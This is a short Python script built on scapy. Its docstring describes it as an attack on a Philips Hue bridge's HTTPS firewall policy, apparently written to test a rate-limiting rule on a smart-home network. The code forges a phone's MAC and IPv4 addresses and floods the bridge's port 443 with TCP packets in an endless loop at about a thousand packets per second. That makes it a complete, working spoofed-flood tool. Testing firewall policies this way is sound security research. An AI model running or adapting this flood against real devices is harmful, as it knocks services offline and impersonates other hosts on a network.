#!/usr/bin/python3

"""
Attack towards the `https-local-app-hue` policy of the Philips Hue bridge.
Flood the Philips Hue bridge with HTTPS packets having the following signature:
    - Source MAC address:       3c:cd:5d:a2:a9:d7 (phone MAC address)
    - Destination MAC address:  00:17:88:74:c2:dc (Philips Hue bridge MAC address)
    - Source IPv4 address:      192.168.1.222 (phone IPv4 address)
    - Destination IPv4 address: 192.168.1.141 (Philips Hue bridge IPv4 address)
    - Destination TCP port:     443
For the attack to be blocked, the rate must exceed 10 packets per second (burst of 100 packets).
"""

import scapy.all as scapy
import random

### GLOBAL VARIABLES ###
mac_src  = "3c:cd:5d:a2:a9:d7"
mac_dst  = "00:17:88:74:c2:dc"
ip_src   = "192.168.1.222"
ip_dst   = "192.168.1.141"
port_dst = 443


### FUNCTIONS ###
def main():
    port_src = random.randint(1024, 65535)
    packet = scapy.Ether(src=mac_src, dst=mac_dst) / scapy.IP(src=ip_src, dst=ip_dst) / scapy.TCP(sport=port_src, dport=port_dst)
    packet = packet.__class__(bytes(packet))
    scapy.sendp(packet, iface="enp0s31f6", loop=1, inter=0.001, verbose=False)


### MAIN PROGRAM ###
if __name__ == "__main__":
    main()
